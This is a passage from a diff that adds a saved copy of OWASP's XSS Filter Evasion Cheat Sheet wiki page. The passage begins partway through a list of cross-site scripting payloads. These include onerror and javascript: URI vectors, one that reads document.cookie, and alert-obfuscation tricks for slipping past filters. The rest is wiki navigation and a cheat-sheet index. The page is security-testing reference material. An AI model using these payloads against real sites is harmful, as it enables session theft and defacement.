+&lt;Video&gt; &lt;source onerror = "javascript: alert (XSS)"&gt;
+&lt;Input value = "XSS" type = text&gt;
+&lt;applet code="javascript:confirm(document.cookie);"&gt;
+&lt;isindex x="javascript:" onmouseover="alert(XSS)"&gt;
+"&gt;&lt;/SCRIPT&gt;”&gt;’&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;
+"&gt;&lt;img src="x:x" onerror="alert(XSS)"&gt;
+"&gt;&lt;iframe src="javascript:alert(XSS)"&gt;
+&lt;object data="javascript:alert(XSS)"&gt;
+&lt;isindex type=image src=1 onerror=alert(XSS)&gt;
+&lt;img src=x:alert(alt) onerror=eval(src) alt=0&gt;
+&lt;img  src="x:gif" onerror="window['al\u0065rt'](0)"&gt;&lt;/img&gt;
+</pre>
+            <h2><span class="mw-headline" id="Filter_Bypass_Alert_Obfuscation">Filter Bypass Alert Obfuscation</span>
+            </h2>
+<pre>(alert)(1)
+a=alert,a(1)
+[1].find(alert)
+top[“al”+”ert”](1)
+top[/al/.source+/ert/.source](1)
+al\u0065rt(1)
+top[‘al\145rt’](1)
+top[‘al\x65rt’](1)
+top[8680439..toString(30)](1)
+</pre>
+            <h1><span class="mw-headline" id="Character_Encoding_and_IP_Obfuscation_Calculators">Character Encoding and IP Obfuscation Calculators</span>
+            </h1>
+            <p>This following links include calculators for doing basic transformation functions that are useful for
+                XSS.
+            </p>
+            <p><a rel="nofollow" class="external free" href="http://ha.ckers.org/xsscalc.html">http://ha.ckers.org/xsscalc.html</a>
+            </p>
+            <h1><span class="mw-headline" id="Authors_and_Primary_Editors">Authors and Primary Editors</span></h1>
+            <p>Robert "RSnake" Hansen
+            </p>
+            <h1><span class="mw-headline" id="Contributors">Contributors</span></h1>
+            <p>Adam Lange<br/>
+                Mishra Dhiraj
+            </p>
+            <h1><span class="mw-headline" id="Other_Cheatsheets">Other Cheatsheets</span></h1>
+            <table class="navigationBox mw-collapsible">
+
+                <tr>
+                    <td colspan="2" class="header"><span class="left"><abbr title="View this template"><strong
+                            class="selflink">V</strong></abbr> - <abbr title="Discuss this template"><strong
+                            class="selflink">T</strong></abbr> - <abbr title="Edit this template"></a><a rel="nofollow"
+                                                                                                         class="external text"
+                                                                                                         href="//www.owasp.org/index.php?title=XSS_Filter_Evasion_Cheat_Sheet&amp;action=edit">E</a><abbr
+                            title="Edit this template"></abbr></span> <b><a href="/index.php/Cheat_Sheets"
+                                                                            title="Cheat Sheets" class="mw-redirect">Cheat
+                        Sheets</a></b>
+                    </td>
+                </tr>
+                <tr>
+                    <td class="category"><b>Developer / Builder</b>
+                    </td>
+                    <td class="links">
+                        <ul>
+                            <li><a href="/index.php/3rd_Party_Javascript_Management_Cheat_Sheet"
+                                   title="3rd Party Javascript Management Cheat Sheet">3rd Party Javascript
+                                Management</a>
+                            </li>
+                            <li><a href="/index.php/Access_Control_Cheat_Sheet" title="Access Control Cheat Sheet">Access
+                                Control</a>
+                            </li>
+                            <li><a href="/index.php/AJAX_Security_Cheat_Sheet" title="AJAX Security Cheat Sheet">AJAX
+                                Security Cheat Sheet</a>
+                            </li>
+                            <li><a href="/index.php/Authentication_Cheat_Sheet" title="Authentication Cheat Sheet">Authentication</a>
+                                (<a href="/index.php/Authentication_Cheat_Sheet_Espa%C3%B1ol"
+                                    title="Authentication Cheat Sheet Español">ES</a>)
+                            </li>
+                            <li><a href="/index.php/Bean_Validation_Cheat_Sheet" title="Bean Validation Cheat Sheet">Bean
+                                Validation Cheat Sheet</a>
+                            </li>
+                            <li><a href="/index.php/Choosing_and_Using_Security_Questions_Cheat_Sheet"
+                                   title="Choosing and Using Security Questions Cheat Sheet">Choosing and Using Security
+                                Questions</a>
+                            </li>
+                            <li><a href="/index.php/Clickjacking_Defense_Cheat_Sheet"
+                                   title="Clickjacking Defense Cheat Sheet">Clickjacking Defense</a>
+                            </li>
+                            <li><a href="/index.php/C-Based_Toolchain_Hardening_Cheat_Sheet"
+                                   title="C-Based Toolchain Hardening Cheat Sheet">C-Based Toolchain Hardening</a>
+                            </li>
+                            <li><a href="/index.php/Credential_Stuffing_Prevention_Cheat_Sheet"
+                                   title="Credential Stuffing Prevention Cheat Sheet">Credential Stuffing Prevention
+                                Cheat Sheet</a>
+                            </li>
+                            <li><a href="/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet"
+                                   title="Cross-Site Request Forgery (CSRF) Prevention Cheat Sheet">Cross-Site Request
+                                Forgery (CSRF) Prevention</a>
+                            </li>
+                            <li><a href="/index.php/Cryptographic_Storage_Cheat_Sheet"
+                                   title="Cryptographic Storage Cheat Sheet">Cryptographic Storage</a>
+                            </li>
+                            <li><a href="/index.php/Deserialization_Cheat_Sheet" title="Deserialization Cheat Sheet">Deserialization</a>
+                            </li>
+                            <li><a href="/index.php/DOM_based_XSS_Prevention_Cheat_Sheet"
+                                   title="DOM based XSS Prevention Cheat Sheet">DOM based XSS Prevention</a>
+                            </li>
+                            <li><a href="/index.php/Forgot_Password_Cheat_Sheet" title="Forgot Password Cheat Sheet">Forgot
+                                Password</a>
+                            </li>
+                            <li><a href="/index.php/HTML5_Security_Cheat_Sheet" title="HTML5 Security Cheat Sheet">HTML5
+                                Security</a>
+                            </li>
+                            <li><a href="/index.php/HTTP_Strict_Transport_Security_Cheat_Sheet"
+                                   title="HTTP Strict Transport Security Cheat Sheet">HTTP Strict Transport Security</a>
+                            </li>
+                            <li><a href="/index.php/Injection_Prevention_Cheat_Sheet"
+                                   title="Injection Prevention Cheat Sheet">Injection Prevention Cheat Sheet</a>
+                            </li>
+                            <li><a href="/index.php/Input_Validation_Cheat_Sheet" title="Input Validation Cheat Sheet">Input
+                                Validation</a>
+                            </li>
+                            <li><a href="/index.php/JAAS_Cheat_Sheet" title="JAAS Cheat Sheet">JAAS</a>
+                            </li>
+                            <li><a href="/index.php/LDAP_Injection_Prevention_Cheat_Sheet"
+                                   title="LDAP Injection Prevention Cheat Sheet">LDAP Injection Prevention</a>
+                            </li>
+                            <li><a href="/index.php/Logging_Cheat_Sheet" title="Logging Cheat Sheet">Logging</a>
+                            </li>
+                            <li><a href="/index.php/Mass_Assignment_Cheat_Sheet" title="Mass Assignment Cheat Sheet">Mass
+                                Assignment Cheat Sheet</a>
+                            </li>
+                            <li><a href="/index.php/.NET_Security_Cheat_Sheet" title=".NET Security Cheat Sheet">.NET
+                                Security</a>
+                            </li>
+                            <li><a href="/index.php/OWASP_Top_Ten_Cheat_Sheet" title="OWASP Top Ten Cheat Sheet">OWASP
+                                Top Ten</a>
+                            </li>
+                            <li><a href="/index.php/Password_Storage_Cheat_Sheet" title="Password Storage Cheat Sheet">Password
+                                Storage</a>
+                            </li>
+                            <li><a href="/index.php/Pinning_Cheat_Sheet" title="Pinning Cheat Sheet">Pinning</a>
+                            </li>
+                            <li><a href="/index.php/Query_Parameterization_Cheat_Sheet"
+                                   title="Query Parameterization Cheat Sheet">Query Parameterization</a>
+                            </li>
+                            <li><a href="/index.php/Ruby_on_Rails_Cheatsheet" title="Ruby on Rails Cheatsheet">Ruby on
+                                Rails</a>
+                            </li>
+                            <li><a href="/index.php/REST_Security_Cheat_Sheet" title="REST Security Cheat Sheet">REST
+                                Security</a>
+                            </li>
+                            <li><a href="/index.php/Session_Management_Cheat_Sheet"
+                                   title="Session Management Cheat Sheet">Session Management</a>
+                            </li>
+                            <li><a href="/index.php/SAML_Security_Cheat_Sheet" title="SAML Security Cheat Sheet">SAML
+                                Security</a>
+                            </li>
+                            <li><a href="/index.php/SQL_Injection_Prevention_Cheat_Sheet"
+                                   title="SQL Injection Prevention Cheat Sheet">SQL Injection Prevention</a>
+                            </li>
+                            <li><a href="/index.php/Transaction_Authorization_Cheat_Sheet"
+                                   title="Transaction Authorization Cheat Sheet">Transaction Authorization</a>
+                            </li>
+                            <li><a href="/index.php/Transport_Layer_Protection_Cheat_Sheet"
+                                   title="Transport Layer Protection Cheat Sheet">Transport Layer Protection</a>
+                            </li>
+                            <li><a href="/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet"
+                                   title="Unvalidated Redirects and Forwards Cheat Sheet">Unvalidated Redirects and
+                                Forwards</a>
+                            </li>
+                            <li><a href="/index.php/User_Privacy_Protection_Cheat_Sheet"
+                                   title="User Privacy Protection Cheat Sheet">User Privacy Protection</a>
+                            </li>
+                            <li><a href="/index.php/Web_Service_Security_Cheat_Sheet"
+                                   title="Web Service Security Cheat Sheet">Web Service Security</a>
+                            </li>
+                            <li><a href="/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet"
+                                   title="XSS (Cross Site Scripting) Prevention Cheat Sheet">XSS (Cross Site Scripting)
+                                Prevention</a>
+                            </li>
+                            <li><a href="/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet"
+                                   title="XML External Entity (XXE) Prevention Cheat Sheet">XML External Entity (XXE)
+                                Prevention Cheat Sheet</a>
+                            </li>
+                        </ul>
+                    </td>
+                </tr>
+                <tr>
+                    <td class="category"><b>Assessment / Breaker</b>
+                    </td>
+                    <td class="links">
+                        <ul>
+                            <li><a href="/index.php/Attack_Surface_Analysis_Cheat_Sheet"
+                                   title="Attack Surface Analysis Cheat Sheet">Attack Surface Analysis</a>
+                            </li>
+                            <li><strong class="selflink">XSS Filter Evasion</strong>
+                            </li>
+                            <li><a href="/index.php/REST_Assessment_Cheat_Sheet" title="REST Assessment Cheat Sheet">REST
+                                Assessment</a>
+                            </li>
+                            <li><a href="/index.php/Web_Application_Security_Testing_Cheat_Sheet"
+                                   title="Web Application Security Testing Cheat Sheet">Web Application Security
+                                Testing</a>
+                            </li>
+                        </ul>
+                    </td>
+                </tr>
+                <tr>
+                    <td class="category"><b>Mobile</b>
+                    </td>
+                    <td class="links">
+                        <ul>
+                            <li><a href="/index.php/Android_Testing_Cheat_Sheet" title="Android Testing Cheat Sheet">Android
+                                Testing</a>
+                            </li>
+                            <li><a href="/index.php/IOS_Developer_Cheat_Sheet" title="IOS Developer Cheat Sheet">IOS
+                                Developer</a>
+                            </li>
+                            <li><a href="/index.php/Mobile_Jailbreaking_Cheat_Sheet"
+                                   title="Mobile Jailbreaking Cheat Sheet">Mobile Jailbreaking</a>
+                            </li>
+                        </ul>
+                    </td>
+                </tr>
+                <tr>
+                    <td class="category"><b>OpSec / Defender</b>
+                    </td>
+                    <td class="links">
+                        <ul>
+                            <li><a href="/index.php/Virtual_Patching_Cheat_Sheet" title="Virtual Patching Cheat Sheet">Virtual
+                                Patching</a>
+                            </li>
+                        </ul>
+                    </td>
+                </tr>
+                <tr>
+                    <td class="category"><b>Draft and Beta</b>
+                    </td>
+                    <td class="links">
+                        <ul>
+                            <li><a href="/index.php/Application_Security_Architecture_Cheat_Sheet"
+                                   title="Application Security Architecture Cheat Sheet">Application Security
+                                Architecture</a>
+                            </li>
+                            <li><a href="/index.php/Business_Logic_Security_Cheat_Sheet"
+                                   title="Business Logic Security Cheat Sheet">Business Logic Security</a>
+                            </li>
+                            <li><a href="/index.php/Command_Injection_Defense_Cheat_Sheet"
+                                   title="Command Injection Defense Cheat Sheet">Command Injection Defense Cheat
+                                Sheet</a>
+                            </li>
+                            <li><a href="/index.php/PHP_Security_Cheat_Sheet" title="PHP Security Cheat Sheet">PHP
+                                Security</a>
+                            </li>
+                            <li><a href="/index.php/Regular_Expression_Security_Cheatsheet"
+                                   title="Regular Expression Security Cheatsheet">Regular Expression Security
+                                Cheatsheet</a>
+                            </li>
+                            <li><a href="/index.php/Secure_Coding_Cheat_Sheet" title="Secure Coding Cheat Sheet">Secure
+                                Coding</a>
+                            </li>
+                            <li><a href="/index.php/Secure_SDLC_Cheat_Sheet" title="Secure SDLC Cheat Sheet">Secure
+                                SDLC</a>
+                            </li>
+                            <li><a href="/index.php/Threat_Modeling_Cheat_Sheet" title="Threat Modeling Cheat Sheet">Threat
+                                Modeling</a>
+                            </li>
+                            <li><a href="/index.php/Grails_Secure_Code_Review_Cheat_Sheet"
+                                   title="Grails Secure Code Review Cheat Sheet">Grails Secure Code Review</a>
+                            </li>
+                            <li><a href="/index.php/IOS_Application_Security_Testing_Cheat_Sheet"
+                                   title="IOS Application Security Testing Cheat Sheet">IOS Application Security
+                                Testing</a>
+                            </li>
+                            <li><a href="/index.php/Key_Management_Cheat_Sheet" title="Key Management Cheat Sheet">Key
+                                Management</a>
+                            </li>
+                            <li><a href="/index.php/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet"
+                                   title="Insecure Direct Object Reference Prevention Cheat Sheet">Insecure Direct
+                                Object Reference Prevention</a>
+                            </li>
+                            <li><a href="/index.php/Content_Security_Policy_Cheat_Sheet"
+                                   title="Content Security Policy Cheat Sheet">Content Security Policy</a>
+                            </li>
+                        </ul>
+                    </td>
+                </tr>
+                <tr>
+                    <td colspan="2" class="neighbors"><a href="/index.php/Category:Cheatsheets"
+                                                         title="Category:Cheatsheets">All Pages In This Category</a>
+                    </td>
+                </tr>
+            </table>
+            <p>
+            </p>
+            <!--
+            NewPP limit report
+            CPU time usage: 0.191 seconds
+            Real time usage: 0.209 seconds
+            Preprocessor visited node count: 1276/1000000
+            Preprocessor generated node count: 2340/1000000
+            Post‐expand include size: 8929/2097152 bytes
+            Template argument size: 3767/2097152 bytes
+            Highest expansion depth: 4/40
+            Expensive parser function count: 0/100
+            -->
+
+            <!-- Saved in parser cache with key wiki:pcache:idhash:26566-0!*!0!!en!2!* and timestamp 20161214204640 and revision id 222088
+             -->
+        </div>
+        <div class="printfooter">
+            Retrieved from "<a
+                href="http://www.owasp.org/index.php?title=XSS_Filter_Evasion_Cheat_Sheet&amp;oldid=222088">http://www.owasp.org/index.php?title=XSS_Filter_Evasion_Cheat_Sheet&amp;oldid=222088</a>"
+        </div>
+        <div id='catlinks' class='catlinks'>
+            <div id="mw-normal-catlinks" class="mw-normal-catlinks"><a href="/index.php/Special:Categories"
+                                                                       title="Special:Categories">Categories</a>:
+                <ul>
+                    <li><a href="/index.php/Category:Cheatsheets" title="Category:Cheatsheets">Cheatsheets</a></li>
+                    <li><a href="/index.php/Category:Popular" title="Category:Popular">Popular</a></li>
+                    <li><a href="/index.php/Category:OWASP_Breakers" title="Category:OWASP Breakers">OWASP Breakers</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+        <div class="visualClear"></div>
+    </div>
+</div>
+<div id="mw-navigation">
+    <h2>Navigation menu</h2>
+    <div id="mw-head">
+        <div id="p-personal" role="navigation" class="" aria-labelledby="p-personal-label">
+            <h3 id="p-personal-label">Personal tools</h3>
+            <ul>
+                <li id="pt-login"><a
+                        href="/index.php?title=Special:UserLogin&amp;returnto=XSS+Filter+Evasion+Cheat+Sheet"
+                        title="You are encouraged to log in; however, it is not mandatory [o]" accesskey="o">Log in</a>
+                </li>
+                <li id="pt-createaccount"><a href="/index.php/Special:RequestAccount">Request account</a></li>
+            </ul>
+        </div>
+        <div id="left-navigation">
+            <div id="p-namespaces" role="navigation" class="vectorTabs" aria-labelledby="p-namespaces-label">
+                <h3 id="p-namespaces-label">Namespaces</h3>
+                <ul>
+                    <li id="ca-nstab-main" class="selected"><span><a href="/index.php/XSS_Filter_Evasion_Cheat_Sheet"
+                                                                     title="View the content page [c]" accesskey="c">Page</a></span>
+                    </li>
+                    <li id="ca-talk"><span><a href="/index.php/Talk:XSS_Filter_Evasion_Cheat_Sheet"
+                                              title="Discussion about the content page [t]" accesskey="t">Discussion</a></span>
+                    </li>
+                </ul>
+            </div>
+            <div id="p-variants" role="navigation" class="vectorMenu emptyPortlet" aria-labelledby="p-variants-label">
+                <h3 id="mw-vector-current-variant">
+                </h3>
+                <h3 id="p-variants-label"><span>Variants</span><a href="#"></a></h3>
+                <div class="menu">
+                    <ul>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <div id="right-navigation">
+            <div id="p-views" role="navigation" class="vectorTabs" aria-labelledby="p-views-label">
+                <h3 id="p-views-label">Views</h3>
+                <ul>
+                    <li id="ca-view" class="selected"><span><a href="/index.php/XSS_Filter_Evasion_Cheat_Sheet">Read</a></span>
+                    </li>
+                    <li id="ca-viewsource"><span><a
+                            href="/index.php?title=XSS_Filter_Evasion_Cheat_Sheet&amp;action=edit"
+                            title="This page is protected.&#10;You can view its source [e]"
+                            accesskey="e">View source</a></span></li>
+                    <li id="ca-history" class="collapsible"><span><a
+                            href="/index.php?title=XSS_Filter_Evasion_Cheat_Sheet&amp;action=history"
+                            title="Past revisions of this page [h]" accesskey="h">View history</a></span></li>
+                </ul>
+            </div>
+            <div id="p-cactions" role="navigation" class="vectorMenu emptyPortlet" aria-labelledby="p-cactions-label">
+                <h3 id="p-cactions-label"><span>Actions</span><a href="#"></a></h3>
+                <div class="menu">
+                    <ul>
+                    </ul>
+                </div>
+            </div>
+            <div id="p-search" role="search">
+                <h3><label for="searchInput">Search</label></h3>
+                <form action="/index.php" id="searchform">
+                    <div id="simpleSearch">
+                        <input type="search" name="search" placeholder="Search" title="Search OWASP [f]" accesskey="f"
+                               id="searchInput"/><input type="hidden" value="Special:Search" name="title"/><input
+                            type="submit" name="fulltext" value="Search" title="Search the pages for this text"
+                            id="mw-searchButton" class="searchButton mw-fallbackSearchButton"/><input type="submit"
+                                                                                                      name="go"
+                                                                                                      value="Go"
+                                                                                                      title="Go to a page with this exact name if exists"
+                                                                                                      id="searchButton"
+                                                                                                      class="searchButton"/>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+    <div id="mw-panel">
+        <div id="p-logo" role="banner"><a style="background-image: url(/skins/owasplogo.png);"
+                                          href="/index.php/Main_Page" title="Visit the main page"></a></div>
+        <div class="portal" role="navigation" id='p-Navigation' aria-labelledby='p-Navigation-label'>
+            <h3 id='p-Navigation-label'>Navigation</h3>
+            <div class="body">
+                <ul>
+                    <li id="n-Home"><a href="/index.php/Main_Page">Home</a></li>
+                    <li id="n-About-OWASP"><a href="/index.php/About_OWASP">About OWASP</a></li>
+                    <li id="n-Acknowledgements"><a href="https://www.owasp.org/index.php/Acknowledgements"
+                                                   rel="nofollow">Acknowledgements</a></li>
+                    <li id="n-Advertising"><a href="https://www.owasp.org/index.php/Advertising" rel="nofollow">Advertising</a>
+                    </li>
+                    <li id="n-AppSec-Events"><a href="/index.php/Category:OWASP_AppSec_Conference">AppSec Events</a>
+                    </li>
+                    <li id="n-Books"><a href="http://stores.lulu.com/owasp" rel="nofollow">Books</a></li>
+                    <li id="n-Brand-Resources"><a href="https://www.owasp.org/index.php/Marketing/Resources"
+                                                  rel="nofollow">Brand Resources</a></li>
+                    <li id="n-Chapters"><a href="https://www.owasp.org/index.php/OWASP_Chapter"
+                                           rel="nofollow">Chapters</a></li>
+                    <li id="n-Donate-to-OWASP"><a href="https://www.owasp.org/index.php/Donate" rel="nofollow">Donate to
+                        OWASP</a></li>
+                    <li id="n-Downloads"><a href="/index.php/Category:OWASP_Download">Downloads</a></li>
+                    <li id="n-Funding"><a href="https://www.owasp.org/index.php/Funding" rel="nofollow">Funding</a></li>
+                    <li id="n-Governance"><a href="https://www.owasp.org/index.php/Governance"
+                                             rel="nofollow">Governance</a></li>
+                    <li id="n-Initiatives"><a
+                            href="https://www.owasp.org/index.php/OWASP_Initiatives_Global_Strategic_Focus"
+                            rel="nofollow">Initiatives</a></li>
+                    <li id="n-Mailing-Lists"><a href="http://lists.owasp.org/mailman/listinfo" rel="nofollow">Mailing
+                        Lists</a></li>
+                    <li id="n-Membership"><a href="/index.php/Membership">Membership</a></li>
+                    <li id="n-Merchandise"><a href="https://www.owasp.org/index.php/OWASP_Merchandise" rel="nofollow">Merchandise</a>
+                    </li>
+                    <li id="n-News"><a href="/index.php/Application_Security_News">News</a></li>
+                    <li id="n-Portal"><a href="https://www.owasp.org/index.php/Portal" rel="nofollow"
+                                         title="About the project, what you can do, where to find things">Community
+                        portal</a></li>
+                    <li id="n-Presentations"><a href="/index.php/Category:OWASP_Presentations">Presentations</a></li>
+                    <li id="n-Press"><a href="https://www.owasp.org/index.php/Press" rel="nofollow">Press</a></li>
+                    <li id="n-Projects"><a href="/index.php/Category:OWASP_Project">Projects</a></li>
+                    <li id="n-Video"><a href="/index.php/Category:OWASP_Video">Video</a></li>
+                    <li id="n-Volunteer"><a href="http://owasp.force.com/volunteers/GW_Volunteers__VolunteersJobListing"
+                                            rel="nofollow">Volunteer</a></li>
+                </ul>
+            </div>
+        </div>
+        <div class="portal" role="navigation" id='p-Reference' aria-labelledby='p-Reference-label'>
+            <h3 id='p-Reference-label'>Reference</h3>
+            <div class="body">
+                <ul>
+                    <li id="n-Activities"><a href="/index.php/Category:Activity">Activities</a></li>
+                    <li id="n-Attacks"><a href="/index.php/Category:Attack">Attacks</a></li>
+                    <li id="n-Code-Snippets"><a href="/index.php/Category:Code_Snippet">Code Snippets</a></li>
+                    <li id="n-Controls"><a href="/index.php/Category:Control">Controls</a></li>
+                    <li id="n-Glossary"><a href="/index.php/Category:Glossary">Glossary</a></li>
+                    <li id="n-How-To..."><a href="/index.php/Category:How_To">How To...</a></li>
+                    <li id="n-Java-Project"><a href="/index.php/Category:OWASP_Java_Project">Java Project</a></li>
+                    <li id="n-.NET-Project"><a href="/index.php/Category:OWASP_.NET_Project">.NET Project</a></li>
+                    <li id="n-Principles"><a href="/index.php/Category:Principle">Principles</a></li>
+                    <li id="n-Technologies"><a href="/index.php/Category:Technology">Technologies</a></li>
+                    <li id="n-Threat-Agents"><a href="/index.php/Category:Threat_Agent">Threat Agents</a></li>
+                    <li id="n-Vulnerabilities"><a href="/index.php/Category:Vulnerability">Vulnerabilities</a></li>
+                </ul>
+            </div>
+        </div>
+        <div class="portal" role="navigation" id='p-languageselector' aria-labelledby='p-languageselector-label'>
+            <h3 id='p-languageselector-label'>Language</h3>
+            <div class="body">
+                <ul>
+                    <li id="n-languageselector" class="active"><a
+                            0="//www.owasp.org/index.php?title=XSS_Filter_Evasion_Cheat_Sheet&amp;setlang=en"
+                            href="//www.owasp.org/index.php?title=XSS_Filter_Evasion_Cheat_Sheet&amp;setlang=en">English</a>
+                    </li>
+                    <li id="n-languageselector"><a
+                            0="//www.owasp.org/index.php?title=XSS_Filter_Evasion_Cheat_Sheet&amp;setlang=es"
+                            href="//www.owasp.org/index.php?title=XSS_Filter_Evasion_Cheat_Sheet&amp;setlang=es">español</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+        <div class="portal" role="navigation" id='p-tb' aria-labelledby='p-tb-label'>
+            <h3 id='p-tb-label'>Tools</h3>
+            <div class="body">
+                <ul>
+                    <li id="t-whatlinkshere"><a href="/index.php/Special:WhatLinksHere/XSS_Filter_Evasion_Cheat_Sheet"
+                                                title="A list of all wiki pages that link here [j]" accesskey="j">What
+                        links here</a></li>
+                    <li id="t-recentchangeslinked"><a
+                            href="/index.php/Special:RecentChangesLinked/XSS_Filter_Evasion_Cheat_Sheet"
+                            title="Recent changes in pages linked from this page [k]" accesskey="k">Related changes</a>
+                    </li>
+                    <li id="t-specialpages"><a href="/index.php/Special:SpecialPages"
+                                               title="A list of all special pages [q]" accesskey="q">Special pages</a>
+                    </li>
+                    <li id="t-print"><a href="/index.php?title=XSS_Filter_Evasion_Cheat_Sheet&amp;printable=yes"
+                                        rel="alternate" title="Printable version of this page [p]" accesskey="p">Printable
+                        version</a></li>
+                    <li id="t-permalink"><a href="/index.php?title=XSS_Filter_Evasion_Cheat_Sheet&amp;oldid=222088"
+                                            title="Permanent link to this revision of the page">Permanent link</a></li>
+                    <li id="t-info"><a href="/index.php?title=XSS_Filter_Evasion_Cheat_Sheet&amp;action=info">Page
+                        information</a></li>
+                </ul>
+            </div>
+        </div>
+    </div>
+</div>
+<div id="footer" role="contentinfo">
+    <ul id="footer-info">
+        <li id="footer-info-lastmod"> This page was last modified on 4 October 2016, at 07:31.</li>
+        <li id="footer-info-viewcount">This page has been accessed 2,621,809 times.</li>
+        <li id="footer-info-copyright">Content is available under <a class="external" rel="nofollow"
+                                                                     href="http://creativecommons.org/licenses/by-sa/3.0/">a
+            Creative Commons 3.0 License</a> unless otherwise noted.
+        </li>
+    </ul>
+    <ul id="footer-places">
+        <li id="footer-places-privacy"><a href="/index.php/OWASP:Privacy_policy" title="OWASP:Privacy policy">Privacy
+            policy</a></li>
+        <li id="footer-places-about"><a href="/index.php/OWASP:About" title="OWASP:About">About OWASP</a></li>
+        <li id="footer-places-disclaimer"><a href="/index.php/OWASP:General_disclaimer"
+                                             title="OWASP:General disclaimer">Disclaimers</a></li>
+    </ul>
+    <ul id="footer-icons" class="noprint">
+        <li id="footer-copyrightico">
+            <a href="http://creativecommons.org/licenses/by-sa/3.0/"><img
+                    src="https://www.owasp.org/images/f/fa/Somerights20.png" alt="a Creative Commons 3.0 License"
+                    width="88" height="31"/></a>
+        </li>
+        <li id="footer-poweredbyico">
+            <a href="//www.mediawiki.org/"><img src="/skins/common/images/poweredby_mediawiki_88x31.png"
+                                                alt="Powered by MediaWiki" width="88" height="31"/></a>
+            <a href="http://www.rackspace.com/cloud/managed_cloud/"><img src="/images/Powered_By_Rackspace_logo.png"
+                                                                         alt="Powered by Rackspace Managed Cloud"
+                                                                         height="30" width="100"/></a>
+        </li>
+    </ul>
+    <div style="clear:both"></div>
+</div>
+<script>/*<![CDATA[*/
+window.jQuery && jQuery.ready();
+/*]]>*/</script>
+<script>if (window.mw) {
+    mw.loader.state({"site": "loading", "user": "ready", "user.groups": "ready"});
+}</script>
+<script>if (window.mw) {
+    mw.loader.load(["mediawiki.action.view.postEdit", "mediawiki.user", "mediawiki.hidpi", "mediawiki.page.ready", "mediawiki.searchSuggest", "ext.languageSelector", "ext.headertabs", "skins.vector.collapsibleNav"], null, true);
+}</script>
+<script type="text/javascript">
+    function buildContent(blog) {
+        var MONTH_NAMES = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];
+        if (!blog || !blog.items) return;
+        var container = document.getElementById("container");
+        var code = "";
+        for (var i = 0; i < blog.items.length; i++) {
+            var item = blog.items[i];
+            var date = new Date();
+            date.setTime(4 + item.published * 1000);
+            var datestring = MONTH_NAMES[date.getMonth()] + " " + (date.getDate());
+            code = code + "<div style='font-weight:bold'>" + datestring + " - ";
+            code = code + "<a href='" + item.alternate.href + "'>" + item.title + "</a> (by ";
+            code = code + "<a href='" + item.origin.streamId.substring(5) + "'>" + item.author + "</a>)</div>";
+            var text = "" + item.content;
+            if (text == "undefined") {
+                text = item.summary;
+            }
+            code = code + "<div>" + text + "</div><br>";
+        }
+        container.innerHTML = code;
+    }
+</script>
+<script type="text/javascript">
+    function build_bloglist(data) {
+
+        var container = document.getElementById('blogroll');
+        var list = document.createElement('div');
+        // Loop through all data items returned
+        for (var i = 0; i < data.items.length; i++) {
+            var item = data.items[i];
+            var link = document.createElement('a');
+            link.appendChild(document.createTextNode(item.title));
+            link.href = item.id;
+            list.appendChild(link);
+            list.appendChild(document.createElement('br'));
+        }
+        container.appendChild(list);
+    }
+</script>
+<script src="//www.owasp.org/load.php?debug=false&amp;lang=en&amp;modules=site&amp;only=scripts&amp;skin=vector&amp;*"></script>
+<script type="text/javascript">
+    var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+    document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script type="text/javascript">
+    try {
+        var pageTracker = _gat._getTracker("UA-4531126-1");
+        pageTracker._trackPageview();
+    } catch (err) {
+    }
+</script>
+<script>if (window.mw) {
+    mw.config.set({"wgBackendResponseTime": 138});
+}</script>
+</body>
+</html>
